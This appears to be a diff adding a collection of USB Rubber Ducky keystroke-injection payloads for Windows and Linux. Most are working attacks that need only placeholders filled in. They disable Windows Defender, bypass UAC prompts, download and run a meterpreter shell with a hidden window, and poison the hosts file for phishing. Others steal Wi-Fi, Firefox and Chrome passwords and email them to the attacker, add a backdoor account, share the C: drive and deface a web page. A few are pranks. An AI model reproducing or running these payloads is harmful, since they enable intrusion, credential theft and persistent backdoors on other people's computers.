@@ -1,0 +1,628 @@
+
+ Payload Wifi-Password-Grabber
+
+DELAY 500
+
+REM Opens the Windows Run prompt.
+GUI r
+
+REM Delays 0.2 seconds to give the Run prompt time to open.
+DELAY 200
+
+REM this command will download the text and save as d.ps1 then run
+REM if the script failed to run change the ExecPolicy to Bypass
+STRING powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget "DOWNLOAD_LINK" -o \d.ps1;\d.ps1
+
+REM Presses Ctrl + Shift + Enter to execute the PowerShell with administrative privileges.
+CTRL-SHIFT ENTER
+
+REM Delay 0.5 seconds to give the UAC prompt time to open.
+DELAY 500
+
+REM Presses Alt + Y to bypass UAC.
+ALT y
+
+
+Payload - WIN10 Disable Windows Defender
+
+
+DELAY 1000
+REM Open Windows Defender settings
+CTRL ESC
+DELAY 1000
+STRING Windows Defender Settings
+DELAY 100
+ENTER
+REM Navigate to realtime protection and disable it
+DELAY 1000
+ENTER
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+DELAY 250
+TAB
+ENTER
+DELAY 1000
+SPACE
+DELAY 1000
+LEFT
+DELAY 500
+ENTER
+REM Close Settings
+DELAY 500
+ALT F4
+DELAY 100
+ALT F4
+
+Payload non malicious auto defacer
+
+
+REM Auto Defacer for Ubuntu Based Machines running Apache.
+REM Author: Xcellerator
+REM Description: Automatically defaces index page of an apache web server.
+DEFAULT_DELAY 200
+ALT F2
+STRING terminal
+ENTER
+STRING cd /var/www
+ENTER
+STRING mv index.* index.bak
+ENTER
+STRING touch index.html
+ENTER
+STRING nano index.html
+ENTER
+STRING <marquee><h1>You have been hacked by the USB Rubber Ducky!</h1></marquee>
+ENTER
+STRING <center><a href="http://www.usbrubberducky.com/"><img src="http://cdn.shopify.com/s/files/1/0068/2142/products/usbducky2.jpg" /></a><center>
+ENTER
+STRING <center><h5>Your old index page can be found <a href="./index.bak">here.</a></h5></center>
+CONTROL x
+STRING y
+ENTER
+STRING exit
+ENTER
+
+Payload - Open Webpage, Any Platform
+
+DELAY 600
+REM Linux run dialog
+ALT F2
+DELAY 200
+REM Mac OS run dialog
+GUI SPACE
+DELAY 200
+REM On Windows this changes the input language, so press 3 times
+GUI SPACE
+DELAY 200
+GUI SPACE
+DELAY 200
+GUI r
+DELAY 200
+REM On another OS, this could have typed "   r". Backspace 4 times.
+DELETE
+REPEAT 4
+REM Type in URL and open page!
+STRING http://example.com/
+ENTER
+
+Payload lock your computer message
+
+DELAY 500
+GUI r
+DELAY 200
+STRING notepad.exe
+ENTER
+DELAY 300
+STRING           , ,\ ,'\,'\ ,'\ ,\ ,
+ENTER
+STRING     ,  ,\/ \' `'     `   '  /|
+ENTER
+STRING     |\/                      |
+ENTER
+STRING     :                        |
+ENTER
+STRING     :                        |
+ENTER
+STRING      |                       |
+ENTER
+STRING      |                       |
+ENTER
+STRING      :               -.     _|
+ENTER
+STRING      :                \     `.
+ENTER
+STRING      |         ________:______\
+ENTER
+STRING      :       ,'o       / o    ,
+ENTER
+STRING      :       \       ,'-----./
+ENTER
+STRING       \_      `--.--'        )
+ENTER
+STRING      ,` `.              ,---'|
+ENTER
+STRING      : `                     |
+ENTER
+STRING       `,-'                   |
+ENTER
+STRING       /      ,---.          ,'
+ENTER
+STRING    ,-'            `-,------'
+ENTER
+STRING    `.        ,--'
+ENTER
+STRING      `-.____/
+ENTER
+STRING             \
+ENTER
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+STRING I will learn to lock my computer.
+ENTER
+ENTER
+STRING There, just like Bart Simpson.
+ENTER
+ENTER
+STRING Please remember to lock your computer (Windows+L) when you step away from your desk.
+ENTER
+ENTER
+STRING Thank you.
+ENTER
+DELAY 100
+ALT SPACE
+STRING x
+DELAY 50
+GUI l
+
+Payload ducky downloader
+
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+DELAY 400
+ENTER
+DELAY 400
+STRING copy con download.vbs
+ENTER
+STRING Set args = WScript.Arguments:a = split(args(0), "/")(UBound(split(args(0),"/")))
+ENTER
+STRING Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP"):objXMLHTTP.open "GET", args(0), false:objXMLHTTP.send()
+ENTER
+STRING If objXMLHTTP.Status = 200 Then
+ENTER
+STRING Set objADOStream = CreateObject("ADODB.Stream"):objADOStream.Open
+ENTER
+STRING objADOStream.Type = 1:objADOStream.Write objXMLHTTP.ResponseBody:objADOStream.Position = 0
+ENTER
+STRING Set objFSO = Createobject("Scripting.FileSystemObject"):If objFSO.Fileexists(a) Then objFSO.DeleteFile a
+ENTER
+STRING objADOStream.SaveToFile a:objADOStream.Close:Set objADOStream = Nothing 
+ENTER
+STRING End if:Set objXMLHTTP = Nothing:Set objFSO = Nothing
+ENTER
+CTRL z
+ENTER
+STRING cscript download.vbs <INSERT URL HERE>
+ENTER
+STRING <INSERT EXE FILENAME HERE>
+ENTER
+STRING exit
+ENTER
+
+Payload - Ducky Phisher
+
+REM Author: .:Shakil:.
+REM Description: Used for phishing, it add's an ip of your choosing to the hosts file on windows
+REM Description: so when the user types into there web browser for example www.facebook.com it
+REM Description: insted of going to the proper ip it gose to the one in the host file your evil one.
+REM Description: you need to add the www. version and with out it as well.
+REM ---[Start CMD as administrator]-----------------------
+GUI
+DELAY 50
+STRING cmd
+DELAY 150
+MENU
+DELAY 75
+STRING a
+ENTER
+DELAY 200
+LEFT
+ENTER
+STRING cls
+ENTER
+REM ---[END]----------------------------------------------
+DELAY 300
+REM ---[Inject into the host file]------------------------
+STRING copy con inject.bat
+ENTER
+STRING SET NEWLINE=^& echo.
+ENTER
+ENTER
+STRING FIND /C /I "[WEBSITE_ADDRESS]" %WINDIR%\system32\drivers\etc\hosts
+ENTER
+STRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] [WEBSITE_ADDRESS]>>%WINDIR%\system32\drivers\etc\hosts
+ENTER
+ENTER
+STRING FIND /C /I "[WEBSITE_ADDRESS]" %WINDIR%\system32\drivers\etc\hosts
+ENTER
+STRING IF %ERRORLEVEL% NEQ 0 ECHO %NEWLINE%^[EVIL_SERVER_IP] [WEBSITE_ADDRESS]>>%WINDIR%\system32\drivers\etc\hosts
+ENTER
+CONTROL z
+ENTER
+STRING inject.bat
+ENTER
+REM ---[END]----------------------------------------------
+DELAY 200
+STRING exit
+ENTER
+
+Payload ftp download upload
+
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 600
+STRING cd %USERPROFILE%
+ENTER
+STRING ftp -i SERVER
+ENTER
+DELAY 800
+STRING USERNAME
+ENTER
+STRING PASSWORD
+ENTER
+STRING GET WinSCP.com
+ENTER
+DELAY 200
+STRING GET WinSCP.exe
+ENTER
+DELAY 3000
+STRING quit
+ENTER
+REM FTP user only needs write access.
+STRING WinSCP.com /command "option batch abort" "option confirm off" "open ftp://USERNAME2:PASSWORD2@SERVER2" "put *.*" "close" "exit"
+ENTER
+ALT SPACE
+STRING N
+
+Payload restart prank
+
+REM /////////////////////////////////////////////////////////////////////////////////////////////////////////
+REM ///       I don't have a ducky (yet) but this is a trick I used to pull on co-workers.               ///
+REM ///       Because I don't have a ducky I'm guessing at the delays based on other scripts.            ///
+REM ////////////////////////////////////////////////////////////////////////////////////////////////////////
+REM Open the command line. You don't need admin because you are only adding to the Users Startup Directory
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING cmd
+ENTER
+DELAY 100
+REM start making Shutdown.bat 
+STRING copy con "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Shutdown.bat"
+STRING @echo off
+ENTER
+STRING shutdown /r /t 30
+REM The shutdown command has many good options '/t' adds a Delay, and '/r' restarts
+REM '/s' will shut the computer down and '/l' (L) is to just logoff the user more options are available by running 'shutdown /?'
+ENTER
+CTRL z
+STRING exit
+ENTER
+REM /////////////////////////////////////////////////////////////////////////////////////////////////////////
+REM ///    I think I did everything right in this, but i don't have a Ducky to test it with. Let me know  ///
+REM ///    what you think or if I made a mistake.					                    ///
+REM /////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Payload Fake Update screen
+
+REM  
+REM let the ducky HID enumerate
+DELAY 3000
+GUI r
+DELAY 500
+STRING iexplore -k http://fakeupdate.net/win10/index.html
+ENTER
+
+Payload rickroll
+
+
+DELAY 3500
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+STRING del %tmp%\rickyou.vbs
+ENTER
+DELAY 200
+STRING del %tmp%\volup.vbs
+ENTER
+DELAY 200
+STRING cd %tmp% && copy con rickyou.vbs
+ENTER
+STRING While true
+ENTER
+STRING Dim oPlayer
+ENTER
+STRING Set oPlayer = CreateObject("WMPlayer.OCX")
+ENTER
+STRING oPlayer.URL = "http://tinyurl.com/s63ve48"
+ENTER
+STRING oPlayer.controls.play
+ENTER
+STRING While oPlayer.playState <> 1 ' 1 = Stopped
+ENTER
+STRING WScript.Sleep 100
+ENTER
+STRING Wend
+ENTER
+STRING oPlayer.close
+ENTER
+STRING Wend
+ENTER
+DELAY 100
+CTRL z
+ENTER
+STRING copy con volup.vbs
+ENTER
+STRING do
+ENTER
+STRING Set WshShell = CreateObject("WScript.Shell")
+ENTER
+STRING WshShell.SendKeys(chr(&hAF))
+ENTER
+STRING loop
+ENTER
+CTRL z
+ENTER
+STRING start rickyou.vbs && volup.vbs
+ENTER
+STRING exit
+ENTER
+
+Payload Fast Meterpreter
+
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -windowstyle hidden $u='YOUR_LINK';$r=Invoke-WebRequest -Uri $u;powershell -nop -e $r.content
+ENTER
+GUI r
+DELAY 1000
+STRING powershell -WindowStyle Hidden -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+
+
+Payload Data Exfiltration Backdoor
+
+
+DELAY 1000
+WINDOWS d
+DELAY 450
+WINDOWS r
+DELAY 450
+STRING powershell Start-Process powershell -Verb runAs
+DELAY 30
+ENTER
+DELAY 500
+ALT y
+DELAY 1000
+REM *****************
+REM # We're going to grab all wifi passwords
+REM *****************
+STRING (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize > C:\Information.txt
+ENTER
+DELAY 500
+REM *****************
+REM # Now we'll grab Network Information (Local IP, Public IP, Hostname)
+REM *****************
+STRING $command = {hostname; Get-NetIpaddress | Where PrefixOrigin -EQ DHCP; Invoke-RestMethod http://ipinfo.io/json | Select -exp ip}
+ENTER
+DELAY 60
+STRING $command.InvokeReturnAsIs() | Out-File C:\Information.txt -Append
+ENTER
+DELAY 400
+REM *****************
+REM # We're going to add a user
+REM *****************
+STRING NET USER Microsoft "l33t" /ADD
+ENTER
+DELAY 100
+REM *****************
+REM # Now we're going to share the C:\ drive out
+REM *****************
+STRING New-SmbShare -Name "Microsoft" -Path "C:\" -FullAccess "Microsoft"
+ENTER
+DELAY 100
+REM *****************
+REM # Let's e-mail ourselves and clean up
+REM *****************
+DELAY 1000
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSSL = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAILHERE', 'PASSWORDHERE!')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'EMAILHERE'
+ENTER
+STRING $ReportEmail.To.Add('EMAILHERE')
+ENTER
+STRING $ReportEmail.Subject = 'Hello from the duck'
+ENTER
+STRING $ReportEmail.Body = (Get-Content C:\Information.txt | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 100
+REM *****************
+REM # Cleanup
+REM *****************
+STRING del C:\Information.txt
+ENTER
+STRING exit
+ENTER
+
+
+Payload - Stealthy-Rapid Meterpreter shell
+
+DELAY 2000
+GUI r
+DELAY 200
+REM Open's powershell and disables Windows Defender
+STRING powershell start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+ENTER 
+DELAY 400
+DELAY 300
+ALT y 
+DELAY 500
+GUI r
+DELAY 600
+REM Download's and execute our reverse meterpreter shell in TEMP folder 
+STRING powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://<I.p_address>/<shell_name>','%TEMP%\<shell_name>');Start-Process "%TEMP%\<shell_name>"
+ENTER
+
+
+Payload Firefox password stealer
+
+
+DELAY 2000
+REM ------------- Open Firefox -------------
+GUI r
+DELAY 500
+STRING firefox
+DELAY 1000
+ENTER
+DELAY 4000
+REM ------------- Navigate to preferences page and views passwords -------------
+CTRL L
+DELAY 250
+STRING about:preferences#privacy
+ENTER
+DELAY 500
+TAB
+REPEAT 14
+ENTER
+DELAY 250
+TAB
+REPEAT 3
+ENTER
+DELAY 250
+ENTER
+DELAY 500
+PRINTSCREEN
+ALT F4
+REM ------------ Save screenshot as png ------------
+DELAY 100
+GUI r
+DELAY 250
+STRING powershell
+DELAY 250
+ENTER
+DELAY 250
+STRING $screenshot = gcb -Format Image
+ENTER
+STRING $path = 'C:\Users\Public\passwords.png'
+ENTER
+STRING $screenshot.Save($path, 'png')
+ENTER
+REM ------------Email Screenshot as an Attachment ------------
+REM ------------ Enter email credentials here ------------ 
+STRING $SMTPServer = 'smtp.gmail.com'
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+ENTER
+STRING $SMTPInfo.EnableSsl = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('[SENDER EMAIL]', '[SENDER PASSWORD]');
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = '[SENDER EMAIL]'
+ENTER
+STRING $ReportEmail.To.Add('[RECEIVER EMAIL]')
+ENTER
+STRING $ReportEmail.Subject = 'USER CREDENTIALS'
+ENTER
+STRING $ReportEmail.Body = 'Here are the usernames I found for you. Quack Quack.'
+ENTER
+STRING $ReportEmail.Attachments.Add('C:\Users\Public\passwords.png')
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 3000
+STRING exit
+ENTER
+
+ Payload - Chrome Passwords to Gmail
+
+DELAY 1000
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING powershell
+DELAY 400
+ENTER
+DELAY 1000
+STRING start-process PowerShell -verb runas
+ENTER
+DELAY 1000
+LEFT
+DELAY 100
+ENTER
+DELAY 1000
+STRING Set-MpPreference -ExclusionPath C:\Users
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 100
+CONTROL ESCAPE
+DELAY 400
+STRING powershell
+DELAY 400
+ENTER
+DELAY 1000
+STRING (New-Object System.Net.WebClient).DownloadFile("CHROME.PS1 LINK HERE","$env:USERPROFILE\Chrome.ps1")
+ENTER
+DELAY 2000
+STRING ./Chrome.ps1
+ENTER
+DELAY 5000
+STRING del Chrome.ps1
+ENTER
+DELAY 1000
+ALT F4
+DELAY 1000
+GUI l
+
+
